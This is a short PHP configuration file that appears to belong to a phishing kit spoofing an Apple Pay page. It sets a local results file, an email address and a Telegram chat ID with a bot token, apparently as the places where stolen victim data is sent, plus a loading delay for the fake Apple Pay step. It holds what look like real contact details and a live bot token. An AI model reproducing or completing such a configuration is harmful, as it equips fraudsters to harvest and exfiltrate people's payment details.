<?php
/*
Author : DIB
Email : drotanique03@gmjail.com
ICQ : @MorrisWorm

*/

// result

$result = "../DIB2023.06.23.txt";


// email

$to = "drotanique03@gmail.com";



// telegram

$chat = "-4194584499";
$token = "6999495409:AAE3oWTChoDTyalYhNusPbe982Io3w-dzvU";


// timer
$timer = 20; # C'est le temps d'attente dans le chargement Apple Pay


?>